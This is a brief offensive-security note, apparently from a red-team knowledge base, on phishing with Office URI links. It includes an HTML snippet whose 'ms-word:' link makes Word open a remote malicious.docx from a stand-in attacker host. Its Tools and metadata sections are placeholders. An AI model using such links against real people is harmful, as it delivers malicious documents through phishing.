# Office Links

When a user clicks on an HTML page having the following format, Microsoft Word will be run to handle the opening of the served document. Links like that could be misused for phishing purposes.

```html
<html>
    <a href="ms-word:nft|u|http://attacker.domain/malicious.docx">Click Me</a>
</html>
```

## Tools
########
########

```meta
ttp: T1000
internal: false
requirements: 
results: 
description: Office-handeld Links
```